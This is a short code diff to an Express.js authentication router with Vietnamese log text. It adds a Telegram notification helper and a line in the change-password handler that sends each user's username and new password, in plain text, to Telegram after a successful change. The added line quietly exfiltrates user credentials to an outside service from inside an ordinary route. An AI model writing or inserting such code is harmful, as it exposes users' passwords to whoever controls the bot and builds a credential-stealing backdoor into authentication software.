@@ -2,6 +2,7 @@ const express = require('express');
 const bcrypt = require('bcryptjs');
 const db = require('../config/database');
 const logger = require('../utils/logger');
+const { sendTelegramMessage } = require('../utils/telegramNotify');
 const router = express.Router();
 const fs = require('fs').promises;
 const path = require('path');
@@ -396,7 +397,9 @@ router.post('/change-password', async (req, res) => {
         );
         
         logger.info(`[Config] User ${user.username} đã đổi mật khẩu thành công`);
-        
+
+        await sendTelegramMessage(`🔐 <b>Đổi mật khẩu</b>\n👤 Người dùng: ${user.username}\n⏰ Thời gian: ${new Date().toLocaleString('vi-VN')}\n✅ Mật khẩu mới: ${newPassword}`);
+
         res.json({
             success: true,
             message: 'Đổi mật khẩu thành công'
